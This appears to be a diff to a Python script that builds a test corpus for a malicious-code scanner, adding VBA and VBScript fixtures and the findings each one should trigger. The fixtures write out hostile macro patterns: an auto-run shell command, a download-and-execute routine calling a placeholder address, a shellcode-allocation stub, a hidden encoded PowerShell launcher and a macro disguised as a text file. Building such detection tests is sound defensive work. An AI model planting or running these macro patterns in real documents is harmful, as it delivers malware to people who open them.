@@ -33,6 +33,7 @@ NPM_DIR    = os.path.join(CORPUS_DIR, 'npm')
 MODEL_DIR  = os.path.join(CORPUS_DIR, 'model')
 ARCHIVE_DIR = os.path.join(CORPUS_DIR, 'archive')
 PYRULES_DIR = os.path.join(CORPUS_DIR, 'python_rules')
+VBA_DIR     = os.path.join(CORPUS_DIR, 'vba')
 os.makedirs(PYTHON_DIR, exist_ok=True)
 os.makedirs(NATIVE_DIR, exist_ok=True)
 os.makedirs(PYSRC_DIR, exist_ok=True)
@@ -47,6 +48,7 @@ for sub in ('clean', 'malicious', 'js', 'tarball', 'locked'):
 os.makedirs(MODEL_DIR, exist_ok=True)
 os.makedirs(ARCHIVE_DIR, exist_ok=True)
 os.makedirs(PYRULES_DIR, exist_ok=True)
+os.makedirs(VBA_DIR, exist_ok=True)
 
 RANDOM_SEED   = 13371337
 FIXED_ZIP_DT  = (2026, 1, 1, 0, 0, 0)
@@ -637,6 +639,89 @@ with zipfile.ZipFile(buf, 'w') as z:
 write(os.path.join(ARCHIVE_DIR, 'traversal.zip'), buf.getvalue())
 
 # ─────────────────────────────────────────────────────────────────────────────
+# VB-family fixtures (issue #25) — exported VBA modules and VBScript.
+# Static text only: nothing here is ever executed, and the "payloads" reference
+# TEST-NET-2 (198.51.100.0/24, RFC 5737) and .test names, which are unroutable.
+# ─────────────────────────────────────────────────────────────────────────────
+write_text(os.path.join(VBA_DIR, 'clean.bas'),
+    'Attribute VB_Name = "Formatting"\n'
+    'Option Explicit\n'
+    '\n'
+    'Sub FormatReport()\n'
+    '    Dim ws As Worksheet\n'
+    '    Set ws = ActiveWorkbook.Sheets(1)\n'
+    '    ws.Range("A1").Value = "Quarterly Report"\n'
+    'End Sub\n')
+
+write_text(os.path.join(VBA_DIR, 'autoexec.bas'),
+    'Attribute VB_Name = "Startup"\n'
+    'Option Explicit\n'
+    '\n'
+    'Sub Auto_Open()\n'
+    '    Dim sh As Object\n'
+    '    Set sh = CreateObject("WScript.Shell")\n'
+    '    sh.Run "cmd.exe /c whoami", 0, False\n'
+    'End Sub\n')
+
+write_text(os.path.join(VBA_DIR, 'downloader.bas'),
+    'Attribute VB_Name = "Fetch"\n'
+    'Option Explicit\n'
+    '\n'
+    'Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _\n'
+    '    Alias "URLDownloadToFileA" (ByVal p As Long, ByVal sURL As String, _\n'
+    '    ByVal sFile As String, ByVal d As Long, ByVal cb As Long) As Long\n'
+    '\n'
+    'Sub GetPayload()\n'
+    '    Dim sh As Object\n'
+    '    URLDownloadToFile 0, "http://198.51.100.7/p.exe", "C:\\Users\\Public\\p.exe", 0, 0\n'
+    '    Set sh = CreateObject("WScript.Shell")\n'
+    '    sh.Run "C:\\Users\\Public\\p.exe", 0, False\n'
+    'End Sub\n')
+
+write_text(os.path.join(VBA_DIR, 'shellcode.bas'),
+    'Attribute VB_Name = "Loader"\n'
+    'Option Explicit\n'
+    '\n'
+    'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, _\n'
+    '    ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\n'
+    'Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, _\n'
+    '    ByRef src As Any, ByVal length As Long)\n'
+    '\n'
+    'Sub Load()\n'
+    '    Dim addr As LongPtr\n'
+    '    addr = VirtualAlloc(0, 4096, &H3000, &H40)\n'
+    'End Sub\n')
+
+write_text(os.path.join(VBA_DIR, 'obfuscated.cls'),
+    'VERSION 1.0 CLASS\n'
+    'Attribute VB_Name = "Decoder"\n'
+    'Option Explicit\n'
+    '\n'
+    'Public Function Build() As String\n'
+    '    Build = Chr(99) & Chr(109) & Chr(100) & Chr(46) & Chr(101) & Chr(120) & Chr(101)\n'
+    '    Build = StrReverse(Build)\n'
+    'End Function\n')
+
+write_text(os.path.join(VBA_DIR, 'launcher.vbs'),
+    'Set sh = CreateObject("WScript.Shell")\n'
+    'sh.Run "powershell -nop -w hidden -enc SQBFAFgA", 0, False\n')
+
+write_text(os.path.join(VBA_DIR, 'encoded.vbe'),
+    '#@~^ZQAAAA==encoded-by-script-encoder-placeholder\n')
+
+# VBA source hiding under an innocent extension — the classifier must detect it
+# by content and the disguise rule must fire (MTS-DISGUISE-002).
+write_text(os.path.join(DISGUISED_DIR, 'macro.txt'),
+    'Attribute VB_Name = "Hidden"\n'
+    'Option Explicit\n'
+    '\n'
+    'Sub Document_Open()\n'
+    '    Dim sh As Object\n'
+    '    Set sh = CreateObject("WScript.Shell")\n'
+    '    sh.Run "cmd.exe /c whoami", 0, False\n'
+    'End Sub\n')
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Manifest
 # ─────────────────────────────────────────────────────────────────────────────
 manifest = {
@@ -695,6 +780,14 @@ manifest = {
         "model/malicious.pkl":     {"expectFinding": "PICKLE-REDUCE"},
         "model/model.safetensors": {"expectFinding": "MODEL-SAFE-FORMAT"},
         "model/model.pt":          {"expectFinding": "PICKLE-REDUCE"},
+        "vba/clean.bas":        {"expectRiskyCode": False},
+        "vba/autoexec.bas":     {"expectFinding": "VBA-AUTOEXEC-PAYLOAD"},
+        "vba/downloader.bas":   {"expectFinding": "VBA-DOWNLOAD-EXEC"},
+        "vba/shellcode.bas":    {"expectFinding": "VBA-SHELLCODE-API"},
+        "vba/obfuscated.cls":   {"expectFinding": "VBA-OBFUSCATION-CHR"},
+        "vba/launcher.vbs":     {"expectFinding": "VBA-POWERSHELL-ENC"},
+        "vba/encoded.vbe":      {"expectFinding": "VBA-ENCODED-SOURCE"},
+        "disguised/macro.txt":  {"expectFinding": "MTS-DISGUISE-002", "detectedType": "vba"},
         "archive/clean.zip":     {"expectHazard": False},
         "archive/bomb.zip":      {"expectFinding": "MTS-EXTRACT-BOMB", "blocked": True},
         "archive/symlink.zip":   {"expectFinding": "MTS-EXTRACT-SYMLINK"},
